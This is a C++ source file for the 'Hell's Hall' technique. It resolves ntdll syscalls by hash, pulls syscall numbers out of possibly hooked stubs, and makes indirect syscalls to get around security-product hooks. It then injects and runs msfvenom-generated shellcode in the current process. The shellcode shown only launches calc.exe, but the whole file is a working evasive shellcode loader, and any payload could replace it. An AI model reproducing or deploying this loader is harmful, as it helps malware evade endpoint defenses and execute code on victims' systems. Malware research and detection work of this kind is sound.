/*
* Title: Hell's Hall
* Resources:
*	- https://github.com/Maldev-Academy/HellHall
*/
#include <Windows.h>
#include <stdint.h>
#include <iostream>
#include "Nt.hpp"
#include "HellsHall.hpp"

// Source: https://stackoverflow.com/a/21001712
uint32_t crc32b(const uint8_t* str) {

	uint32_t    byte = 0x0,
		mask = 0x0,
		crc = 0xFFFFFFFF;
	int         i = 0x0,
		j = 0x0;

	while (str[i] != 0) {
		byte = str[i];
		crc = crc ^ byte;

		for (j = 7; j >= 0; j--) {
			mask = -1 * (crc & 1);
			crc = (crc >> 1) ^ (SEED & mask);
		}

		i++;
	}
	return ~crc;
}

BOOL InitSysFunc(SysFunc* pSysFunc, UINT32 uSysFuncHash) {
	if (!uSysFuncHash)
		return FALSE;

	// Get NTDLL module and EAT
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	if (!pDte) return FALSE;
	PVOID pNtdll = pDte->DllBase;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdll;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdll + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	
	PDWORD pdwArrayOfFunctions = (PDWORD)((PBYTE)pNtdll + pExportDir->AddressOfFunctions);
	PDWORD pdwArrayOfNames = (PDWORD)((PBYTE)pNtdll + pExportDir->AddressOfNames);
	PWORD pwArrayOfOrdinals = (PWORD)((PBYTE)pNtdll + pExportDir->AddressOfNameOrdinals);

	// Find target sys function
	for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++) {
		CHAR* cFuncName = (CHAR*)(pdwArrayOfNames[i] + (PBYTE)pNtdll);

		if (HASH(cFuncName) == uSysFuncHash) {
			pSysFunc->uHash = uSysFuncHash;
			pSysFunc->pAddress = (PBYTE)(pdwArrayOfFunctions[pwArrayOfOrdinals[i]] + (PBYTE)pNtdll);

			DWORD j = 0;

			while (TRUE) {
				// We reach `ret` instruction - that is too far down
				if (*((PBYTE)pSysFunc->pAddress + j) == 0xC3 && !pSysFunc->pInst)
					return FALSE;

				// Search for
				//	mov r10, rcx
				//	mov rcx, <SSN>
				if (*((PBYTE)pSysFunc->pAddress + j + 0x00) == 0x4C &&
					*((PBYTE)pSysFunc->pAddress + j + 0x01) == 0x8B &&
					*((PBYTE)pSysFunc->pAddress + j + 0x02) == 0xD1 &&
					*((PBYTE)pSysFunc->pAddress + j + 0x03) == 0xB8) {

					BYTE low = *((PBYTE)pSysFunc->pAddress + j + 0x04);
					BYTE high = *((PBYTE)pSysFunc->pAddress + j + 0x05);

					// Get the SSN
					pSysFunc->wSSN = (high << 0x08) | low;

					// Get the address of the `syscall` instruction, so that we can jump to later.
					for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
						if (*((PBYTE)pSysFunc->pAddress + j + z) == 0x0F && *((PBYTE)pSysFunc->pAddress + j + x) == 0x05) {
							pSysFunc->pInst = (pSysFunc->pAddress + j + z);
							break;
						}
					}

					if (pSysFunc->wSSN && pSysFunc->pInst)
						return TRUE;
					else
						return FALSE;
				}

				// Hooked
				j++;
			}
		}
	}

	return FALSE;
}

VOID GetSysFuncStruct(PSysFunc pSysFuncSrc, PSysFunc pSysFuncDest) {
	pSysFuncDest->pAddress = pSysFuncSrc->pAddress;
	pSysFuncDest->pInst = pSysFuncSrc->pInst;
	pSysFuncDest->uHash = pSysFuncSrc->uHash;
	pSysFuncDest->wSSN = pSysFuncSrc->wSSN;
}

BOOL HellsHallMain() {
	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	// Resolve syscall functions.
	SysFunc sysFunc = {};
	MyStruct s = {};
	if (!InitSysFunc(&sysFunc, HASH_NTALLOCATEVIRTUALMEMORY))
		return FALSE;
	GetSysFuncStruct(&sysFunc, &s.NtAllocateVirtualMemory);
	if (!InitSysFunc(&sysFunc, HASH_NTPROTECTVIRTUALMEMORY))
		return FALSE;
	GetSysFuncStruct(&sysFunc, &s.NtProtectVirtualMemory);
	if (!InitSysFunc(&sysFunc, HASH_NTCREATETHREADEX))
		return FALSE;
	GetSysFuncStruct(&sysFunc, &s.NtCreateThreadEx);
	if (!InitSysFunc(&sysFunc, HASH_NTWAITFORSINGLEOBJECT))
		return FALSE;
	GetSysFuncStruct(&sysFunc, &s.NtWaitForSingleObject);

	// ------------------------------------------------------------------------- //
	// The following code is the shellcode injection using HellsHall
	// ------------------------------------------------------------------------- //

	PVOID pAddress = nullptr;
	SIZE_T dwShellcodeSize = sizeof(shellcode);
	DWORD dwOldProtect = 0;
	HANDLE hThread = nullptr;

	SYSCALL(s.NtAllocateVirtualMemory);
	NTSTATUS status = HellsHall((HANDLE)-1, &pAddress, 0, &dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
		return FALSE;

	memcpy(pAddress, shellcode, sizeof(shellcode));

	SYSCALL(s.NtProtectVirtualMemory);
	status = HellsHall((HANDLE)-1, &pAddress, &dwShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
	if (!NT_SUCCESS(status))
		return FALSE;

	SYSCALL(s.NtCreateThreadEx);
	status = HellsHall(&hThread, 0x1FFFFF, nullptr, (HANDLE)-1, pAddress, nullptr, FALSE, nullptr, nullptr, nullptr, nullptr);
	if (!NT_SUCCESS(status))
		return FALSE;

	SYSCALL(s.NtWaitForSingleObject);
	status = HellsHall(hThread, FALSE, NULL); // NULL = Infinite
	if (!NT_SUCCESS(status))
		return FALSE;

	return TRUE;
}
